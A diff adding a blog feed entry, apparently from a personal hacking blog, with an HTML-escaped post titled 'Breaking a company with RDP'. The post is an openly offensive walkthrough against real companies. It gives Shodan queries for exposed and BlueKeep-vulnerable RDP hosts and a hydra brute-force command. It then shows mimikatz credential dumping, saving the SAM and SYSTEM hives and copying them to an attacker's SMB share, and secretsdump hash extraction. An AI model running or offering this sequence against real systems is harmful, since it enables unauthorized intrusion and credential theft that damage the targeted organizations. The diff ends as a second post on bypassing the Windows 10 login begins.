@@ -12,6 +12,120 @@
     </author>
     
       <item>
+        <title>Breaking a company with RDP</title>
+        <description>&lt;p&gt;RDP is a remote access protocol by which valid users can be logged in, cybercriminals often exploit this port to gain access to companies and sell access to it.&lt;/p&gt;
+
+&lt;h2 id=&quot;searching-on-shodan&quot;&gt;Searching on Shodan&lt;/h2&gt;
+
+&lt;p&gt;We need to go to &lt;a href=&quot;https://shodan.io&quot;&gt;shodan&lt;/a&gt;, now we need to log in to be able to search in shodan.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;https://eltallerdelbit.com/wp-content/uploads/2017/11/shodan-search-engine-for-the-internet-of-things.jpg&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;Now you need to search with this query.&lt;/p&gt;
+
+&lt;p&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;
+port:3389
+&lt;/code&gt;&lt;/p&gt;
+
+&lt;p&gt;With this we will be looking for those servers with port 3389 open.&lt;/p&gt;
+
+&lt;p&gt;Some queries which are advisable to look for&lt;/p&gt;
+
+&lt;div class=&quot;language-ruby highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;n&quot;&gt;port&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;3389&lt;/span&gt;
+&lt;span class=&quot;n&quot;&gt;port&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;3389&lt;/span&gt; &lt;span class=&quot;no&quot;&gt;Country&lt;/span&gt;&lt;span class=&quot;ss&quot;&gt;:ES&lt;/span&gt;
+&lt;span class=&quot;n&quot;&gt;port&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;3389&lt;/span&gt; &lt;span class=&quot;no&quot;&gt;Administrator&lt;/span&gt;
+&lt;span class=&quot;n&quot;&gt;port&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;3389&lt;/span&gt; &lt;span class=&quot;no&quot;&gt;Administracion&lt;/span&gt;
+&lt;span class=&quot;n&quot;&gt;vuln&lt;/span&gt;&lt;span class=&quot;ss&quot;&gt;:cve&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;2019&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;mo&quot;&gt;070&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;8&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;After enter this querys, we can see a lot of servers with the rdp port open.
+Thanks to shodan we will be able to see existing users of the system to brute force.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;https://i.ibb.co/7pgxM7w/proof.png&quot; /&gt;&lt;/p&gt;
+
+&lt;h2 id=&quot;vulnerabilities&quot;&gt;Vulnerabilities&lt;/h2&gt;
+
+&lt;p&gt;During the covid quarantine, cybercriminals were exploiting vulnerabilities in servers with port 3389, several of the vulnerabilities were as follows.&lt;/p&gt;
+
+&lt;h3 id=&quot;bluekeep-cve-2019-0708&quot;&gt;Bluekeep (CVE-2019-0708)&lt;/h3&gt;
+
+&lt;p&gt;&lt;em&gt;BlueKeep seeks to run malicious code in the kernel memory of the server, allowing the hacker to take control of the entire system. The key to sending this code to the server is in the session setup. It’s at this point that BlueKeep sends arbitrary code to the server. The server stores it in memory, then frees the memory up again. However, because the server retains a pointer to the memory, BlueKeep is able to execute the malicious code.&lt;/em&gt;&lt;/p&gt;
+
+&lt;p&gt;&lt;em&gt;Technical analysis &lt;a href=&quot;https://iotsecuritynews.com/technical-analysis-of-bluekeep/&quot;&gt;here&lt;/a&gt;&lt;/em&gt;&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;https://2164375935-files.gitbook.io/~/files/v0/b/gitbook-legacy-files/o/assets%2F-Lp0LQX2B5gc18QD-Izh%2F-LuIi6zKvZyZXercxtu0%2F-LuJ523Xqfri-cqUzLKw%2FFlinkCEP-Bluekeep-NFA-Schema.jpg?alt=media&amp;amp;token=d806db30-1871-4b46-a7ec-4e68b24d16eb&quot; /&gt;&lt;/p&gt;
+
+&lt;h3 id=&quot;dejablue-cve-2019-1181-cve-2019-1182-cve-2019-1222-and-cve-2019-1226&quot;&gt;DejaBlue (CVE-2019-1181 CVE-2019-1182 CVE-2019-1222 and CVE-2019-1226)&lt;/h3&gt;
+
+&lt;p&gt;&lt;em&gt;In August 2019, Microsoft used its Patch Tuesday to release new patches related to CVEs affecting the remote desktop protocol. Of those vulnerabilities, four stand out for their striking similarity to the BlueKeep vulnerability.&lt;/em&gt;&lt;/p&gt;
+
+&lt;ul&gt;
+  &lt;li&gt;
+    &lt;p&gt;&lt;strong&gt;CVE-2019-1181 and CVE-2019-1182: affect devices running Windows 7, Windows 8.1 or Windows 10, as well as any device running Windows Server 2008, Windows Server 2012, Windows Server 2016 or Windows Server 2019.&lt;/strong&gt;&lt;/p&gt;
+  &lt;/li&gt;
+  &lt;li&gt;
+    &lt;p&gt;&lt;strong&gt;CVE-2019-1222 y CVE-2019-1226: afectan a los dispositivos que ejecutan Windows 10 o Windows Server 2019.&lt;/strong&gt;&lt;/p&gt;
+  &lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;p&gt;&lt;em&gt;DejaBlue vulnerabilities are based on flaws in the early stages of an RDP connection. Since the flaws reside in the processes preceding the authentication phase, no prior knowledge of passwords or keys is required to undertake an attack that can ultimately lead to illicit remote code execution.&lt;/em&gt;&lt;/p&gt;
+
+&lt;p&gt;&lt;em&gt;Technical Analysis &lt;a href=&quot;https://www.malwaretech.com/2019/08/dejablue-analyzing-a-rdp-heap-overflow.html&quot;&gt;here&lt;/a&gt;&lt;/em&gt;&lt;/p&gt;
+
+&lt;h2 id=&quot;bruteforce&quot;&gt;BruteForce&lt;/h2&gt;
+
+&lt;p&gt;We are going to use hydra, to make the bruteforce&lt;/p&gt;
+
+&lt;div class=&quot;language-java highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;n&quot;&gt;hydra&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;no&quot;&gt;L&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;user&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;txt&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;no&quot;&gt;P&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;pass&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;txt&lt;/span&gt; &lt;span class=&quot;no&quot;&gt;IP_VICTIM&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;rdp&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;&lt;img src=&quot;https://1.bp.blogspot.com/-NqCFAA8TlVQ/XufVdykKZnI/AAAAAAAAHB4/wQlcf0Cm3BwGgywbLDklRXJ9P1ZoZzQSQCNcBGAsYHQ/s1600/4_hydra-fuerza-bruta-profundidad-rdp.pnghttps%3A%2F%2Ftelegra.ph%2Ffile%2F3f4b2c33b38d472797e54.png&quot; /&gt;&lt;/p&gt;
+
+&lt;h2 id=&quot;privesc&quot;&gt;Privesc&lt;/h2&gt;
+
+&lt;p&gt;After have access to the RDP server with a valid access, now we need to dump the passwords to scalate the privilages with mimikatz.&lt;/p&gt;
+
+&lt;h3 id=&quot;mimikatz&quot;&gt;Mimikatz&lt;/h3&gt;
+
+&lt;p&gt;&lt;strong&gt;Obtaining credentials in plain text&lt;/strong&gt;&lt;/p&gt;
+
+&lt;div class=&quot;language-ruby highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;o&quot;&gt;~&lt;/span&gt;&lt;span class=&quot;vg&quot;&gt;$&amp;gt;&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;privilage&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;::&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;debug&lt;/span&gt;
+&lt;span class=&quot;o&quot;&gt;~&lt;/span&gt;&lt;span class=&quot;vg&quot;&gt;$&amp;gt;&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;sekurlsa&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;::&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;logonpasswords&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;&lt;img src=&quot;https://www.ngi.es/wp-content/uploads/2021/10/mimikatz_tool_bg.jpg&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;&lt;strong&gt;Obtaining sam and system hashes&lt;/strong&gt;&lt;/p&gt;
+
+&lt;div class=&quot;language-ruby highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;o&quot;&gt;~&lt;/span&gt;&lt;span class=&quot;vg&quot;&gt;$&amp;gt;&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;reg&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;save&lt;/span&gt; &lt;span class=&quot;no&quot;&gt;HKLM&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;\&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;sam&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;sam&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;backup&lt;/span&gt;
+&lt;span class=&quot;o&quot;&gt;~&lt;/span&gt;&lt;span class=&quot;vg&quot;&gt;$&amp;gt;&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;reg&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;save&lt;/span&gt; &lt;span class=&quot;no&quot;&gt;HKLM&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;\&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;system&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;system&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;backup&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;Now we need to transfer this files to our system with impacket-smbserver&lt;/p&gt;
+
+&lt;p&gt;&lt;em&gt;Server&lt;/em&gt;&lt;/p&gt;
+&lt;div class=&quot;language-sh highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;~&lt;span class=&quot;nv&quot;&gt;$&amp;gt;&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;sudo &lt;/span&gt;impacket-smbserver smbFolder &lt;span class=&quot;si&quot;&gt;$(&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;pwd&lt;/span&gt;&lt;span class=&quot;si&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-smb2support&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;&lt;em&gt;Victim&lt;/em&gt;&lt;/p&gt;
+&lt;div class=&quot;language-ruby highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;copy&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;sam&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;backup&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;\\&lt;/span&gt;&lt;span class=&quot;mf&quot;&gt;10.10&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;mf&quot;&gt;14.60&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;\&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;smbFolder&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;\&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;sam&lt;/span&gt;
+&lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;copy&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;system&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;backup&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;\\&lt;/span&gt;&lt;span class=&quot;mf&quot;&gt;10.10&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;mf&quot;&gt;14.60&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;\&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;smbFolder&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;\&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;system&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;&lt;strong&gt;Dumping sam and system hashes&lt;/strong&gt;&lt;/p&gt;
+&lt;div class=&quot;language-ruby highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;o&quot;&gt;~&lt;/span&gt;&lt;span class=&quot;vg&quot;&gt;$&amp;gt;&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;impacket&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;secretsdump&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;sam&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;sam&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;system&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;system&lt;/span&gt; &lt;span class=&quot;no&quot;&gt;LOCAL&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+&lt;p&gt;&lt;img src=&quot;https://i.ibb.co/Tr5jV3n/ld.png&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;&lt;strong&gt;After this, now we have dumped the credentials and have total access to the company.&lt;/strong&gt;&lt;/p&gt;
+</description>
+        <pubDate>Mon, 08 Aug 2022 00:00:00 +0200</pubDate>
+        <link>http://localhost:8000//Breaking-Company-RDP</link>
+        <link href="http://localhost:8000/Breaking-Company-RDP"/>
+        <guid isPermaLink="true">http://localhost:8000/Breaking-Company-RDP</guid>
+      </item>
+    
+      <item>
         <title>How to bypass Windows 10 Login Panel</title>
         <description>&lt;p&gt;&lt;em&gt;Hi, I’m going to show you how to bypass the Login Panel of Windows 10 💻&lt;/em&gt;&lt;/p&gt;
 
